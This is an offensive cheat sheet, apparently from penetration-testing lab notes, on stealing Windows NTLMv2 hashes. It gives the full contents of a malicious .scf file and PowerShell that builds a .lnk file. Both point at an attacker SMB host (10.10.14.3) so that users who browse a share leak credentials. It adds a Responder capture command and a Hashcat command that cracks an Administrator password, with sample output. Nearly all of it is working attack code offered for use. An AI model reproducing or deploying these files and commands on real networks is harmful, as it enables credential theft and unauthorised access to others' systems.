# Malicious SCF and .LNK File Attacks

Windows Explorer can be abused to leak NTLMv2 hashes via malicious `.scf` or `.lnk` files placed in file shares. These techniques are especially useful in internal engagements or post-exploitation stages when access to shared folders is available.
## 1. SCF on a File Share

An SCF (Shell Command File) is used by Windows to perform file explorer actions such as showing the desktop or navigating directories. It can be weaponized to initiate SMB authentication attempts to attacker-controlled shares.

When a user browses a directory containing a malicious `.scf`, Windows automatically initiates an SMB connection to the `IconFile` path — leaking the user's NTLMv2 hash.

### Malicious SCF File Example

Create a file like `@Inventory.scf` (starts with `@` so it's sorted at the top):

```ini
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico

[Taskbar]
Command=ToggleDesktop
```
## 2. Start Responder to Capture Hashes

Start Responder on your attack box to capture NTLMv2 hashes from any user who browses the share:

```bash
sudo responder -wrf -v -I tun0
```

Expected output:

```
[SMB] NTLMv2-SSP Client   : 10.129.43.30
[SMB] NTLMv2-SSP Username : WINLPE-SRV01\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::WINLPE-SRV01:815c...<SNIP>...
```

Let the share idle until a victim browses the folder — NTLMv2 hashes will be captured passively.
## 3. Crack the Hash with Hashcat

Once hashes are captured, crack them offline with Hashcat:

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

Example output:

```
Recovered........: 1/1 (100.00%) Digests
Hash.Name........: NetNTLMv2
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Hash.Target......: Administrator::WINLPE-SRV01:...
Password.........: Welcome1
```

## 4. Capturing Hashes Using a Malicious .LNK File

Starting from Server 2019, `.scf`-based techniques are no longer effective, but malicious `.lnk` files can still trigger outbound SMB auth when loaded in a folder view.
## 5. Generate Malicious .LNK File with PowerShell

```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\10.10.14.3\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

Drop this `.lnk` file into a shared folder or user Desktop to trigger hash leak when browsed.
# Tags
> #Windows-Post-Exploitation #Windows-Privesc #Malicious_SCF_lnk_Files